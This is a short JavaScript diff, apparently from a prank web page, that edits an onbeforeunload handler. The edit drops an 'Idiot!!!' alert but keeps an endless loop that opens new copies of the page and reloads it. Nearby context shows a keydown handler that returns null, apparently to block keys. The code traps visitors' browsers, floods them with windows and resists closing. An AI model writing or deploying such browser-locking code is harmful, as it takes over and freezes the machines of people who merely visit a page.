@@ -136,9 +136,7 @@ window.onkeydown = function() {
 	return null;
 }
 
-window.onbeforeunload = function() {
-    alert("Idiot!!!");
-	
+window.onbeforeunload = function() {	
     while(true){
 	window.open(location.href);
     window.location.reload();
